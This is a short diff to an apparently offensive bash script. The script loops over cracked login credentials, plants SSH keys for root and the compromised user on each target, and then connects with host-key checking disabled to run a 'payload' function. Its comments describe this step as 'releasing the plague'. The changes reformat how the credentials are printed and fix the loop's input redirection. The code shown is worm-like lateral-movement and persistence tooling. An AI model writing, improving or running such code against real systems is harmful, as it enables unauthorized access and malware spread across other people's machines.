@@ -408,9 +408,10 @@ while read -r tango; do
 	username="$(echo $tango | cut -d" " -f2)"
 	password="$(echo $tango | cut -d" " -f3)"
 
-	echo "target= $target"
-	echo "username= $username"
-	echo "password= $password"
+	echo "------------------------------------------------------------------"
+	echo "|target= $target       |"
+	echo "|username= $username   |"
+	echo "|password= $password   |"
 
 	#inserting ssh keys for root and the cracked user
 	printf "\nInserting ssh key into [$target] using: $username\n"
@@ -427,7 +428,7 @@ while read -r tango; do
 	#jumping into each box and letting loose the plague
 	printf "\nReleasing the plague inside of [$target]\n"
 	ssh -n -o StrictHostKeyChecking=no $target "$(declare -f payload); payload"
-done < (sort -u $crackedLogins)
+done <<< $(sort -u $crackedLogins)
 
 }
 
